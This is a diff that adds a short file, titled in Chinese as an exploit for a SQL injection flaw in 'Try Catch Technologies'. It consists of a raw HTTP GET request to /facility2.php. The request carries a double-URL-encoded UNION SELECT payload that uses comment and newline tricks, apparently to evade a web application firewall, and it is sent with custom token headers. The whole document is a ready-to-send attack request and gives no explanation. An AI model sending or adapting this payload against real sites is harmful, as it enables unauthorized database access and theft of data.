@@ -1,0 +1,9 @@
+# 利用【Try Catch Technologies - SQL注入漏洞】-80000230
+# Try Catch Technologies - 存在SQL注入漏洞
+GET /facility2.php?acid=80000230&id=100&acid=-10%2520%2523AAAA%250Aunion%2520%2523AAA%250Aselect%25201%2C2%2Cversion%28%29%2C4--&bid=hd_tag_m8mv26no HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26no
+RM-PRO-Token: ec2b5c45a2f59fb7c228f66cdad8444e
+RM-PRO-Time: 1742808641736
+User-Agent: curl/7.83.1
+
